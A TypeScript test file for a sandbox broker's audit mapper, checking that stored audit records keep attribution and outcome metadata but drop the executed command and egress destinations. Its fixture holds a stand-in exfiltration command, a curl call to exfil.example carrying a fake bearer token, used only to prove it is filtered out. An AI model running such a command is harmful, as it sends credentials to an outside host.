/**
 * The audit record's METADATA-ONLY contract (exec-plane S1b activation,
 * cinatra#2138 deliverable 3).
 *
 * The activation slice binds the broker's audit sink straight to the authz
 * audit kernel through `toAuthzAuditEventInput`. That mapper is therefore the
 * boundary that decides what a durable audit row can ever contain — so it gets
 * a NEGATIVE pin here, not only the positive field mapping the broker suite
 * already asserts: the executed command and the per-destination egress list
 * exist on the in-memory record and must NOT survive the mapping.
 */
import { describe, expect, it } from "vitest";

import { toAuthzAuditEventInput } from "../broker";
import { DEFAULT_SANDBOX_LIMITS, type ExecutionAuditRecord } from "../types";

const RECORD: ExecutionAuditRecord = {
  jobId: "job-1",
  orgId: "org-1",
  userId: "user-1",
  surface: "agent_run",
  runId: "run-1",
  // Present on the in-memory record (the broker needs it for the command
  // policy hook and the stdio correlation) — must never reach a durable row.
  command: "curl https://exfil.example -H 'authorization: Bearer sk-live-secret'",
  cwd: "/workspace",
  decision: "executed",
  exitCode: 0,
  termination: "exited",
  imageDigest: "sha256:deadbeef",
  effectivePolicy: { egressMode: "allowlist", limits: DEFAULT_SANDBOX_LIMITS },
  egressDestinations: [
    { host: "exfil.example", port: 443, allowed: false },
    { host: "pypi.org", port: 443, allowed: true },
  ],
  egressTotalBytes: 4096,
  wallMs: 120,
  workspaceKb: 64,
  atMs: 1_700_000_000_000,
};

describe("toAuthzAuditEventInput — metadata only", () => {
  it("drops the executed command and the per-destination egress list", () => {
    const mapped = toAuthzAuditEventInput(RECORD);
    expect(mapped.metadata).not.toHaveProperty("command");
    expect(mapped.metadata).not.toHaveProperty("egressDestinations");
    const serialized = JSON.stringify(mapped);
    for (const forbidden of ["curl", "sk-live-secret", "exfil.example", "pypi.org"]) {
      expect(serialized).not.toContain(forbidden);
    }
  });

  it("keeps the attribution + outcome + environment identity the issue names", () => {
    const mapped = toAuthzAuditEventInput(RECORD);
    expect(mapped).toMatchObject({
      organizationId: "org-1",
      actorPrincipalId: "user-1",
      actorPrincipalType: "model",
      resourceType: "execution_sandbox",
      operation: "sandbox_execute",
      decision: "allowed",
      runId: "run-1",
    });
    expect(mapped.metadata).toMatchObject({
      surface: "agent_run",
      exitCode: 0,
      termination: "exited",
      imageDigest: "sha256:deadbeef",
      egressMode: "allowlist",
      egressTotalBytes: 4096,
    });
  });

  it("a refusal maps to a denied decision carrying only its reason class", () => {
    const mapped = toAuthzAuditEventInput({
      ...RECORD,
      decision: "refused",
      reason: "run_removed",
      exitCode: undefined,
      termination: undefined,
    });
    expect(mapped.decision).toBe("denied");
    expect(mapped.metadata.reason).toBe("run_removed");
    expect(JSON.stringify(mapped)).not.toContain("curl");
  });
});
